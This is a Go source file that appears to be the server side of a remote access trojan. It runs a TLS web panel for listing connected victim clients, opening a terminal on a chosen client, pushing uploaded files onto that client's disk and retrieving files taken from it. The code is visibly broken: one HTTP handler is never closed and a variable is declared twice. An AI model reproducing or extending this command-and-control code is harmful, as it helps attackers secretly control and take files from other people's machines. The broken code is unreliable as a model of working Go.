package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"rat/command/utils"
	"rat/common"
	"strconv"
)

const (
	ConfigFile = "config.json"
)

type TempFile struct {
	Path string
	Name string
}

// TempFiles contains mappings to downloaded files in temporary directory
var TempFiles map[string]TempFile

func addDownload(tf TempFile) string {
	tempKey := utils.Sha256(tf.Path)
	TempFiles[tempKey] = tf

	return tempKey
}

type ClientPage struct {
	*Client
}

func NewSingle(client *Client) ClientPage {
	return ClientPage{client}
}

func main() {
	var config Server
	data, err := ioutil.ReadFile("config.json")

	if err != nil {
		log.Fatal("failed to load", ConfigFile)
		return
	}

	json.Unmarshal(data, &config)

	go Listen(&config)

	funcMap := template.FuncMap{
		"Version": func() string { return common.Version },
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("index.template.html").Funcs(funcMap).ParseFiles("web/index.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))

		err := t.Execute(w, &Clients)
	http.HandleFunc("/terminal", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("terminal.template.html").Funcs(funcMap).ParseFiles("web/terminal.template.html"))

		var client *Client

		for _, k := range Clients {
			id, err := strconv.Atoi(r.FormValue("id"))

			if k.Id == id && err == nil {
				client = k
				break
			}
		}

		if client == nil {
			panic("not valid id")
		}

		err := t.Execute(w, client)
		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
		dir := r.PostFormValue("directory")

		file, header, err := r.FormFile("file")

		if err != nil {
			fmt.Println(err.Error())
		}

		id, _ := strconv.Atoi(r.PostFormValue("id"))
		client := GetClient(id)

		remote := dir + header.Filename
		fmt.Println("Remote file:", remote)

		err = StartTransfer(client, file, remote)
		if err != nil {
			fmt.Println("upload:", err.Error())
		}
	})
	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
		if file, ok := TempFiles[r.FormValue("key")]; ok {
			w.Header().Set("Content-Disposition", "attachment; filename="+file.Name)

			http.ServeFile(w, r, file.Path)
		}
	})
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))

	InitControlSocket()

	log.Fatal(http.ListenAndServeTLS(config.HttpAddress, "cert.pem", "private.key", nil))
}

func init() {
	InitPackets()
	TempFiles = make(map[string]TempFile)
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}
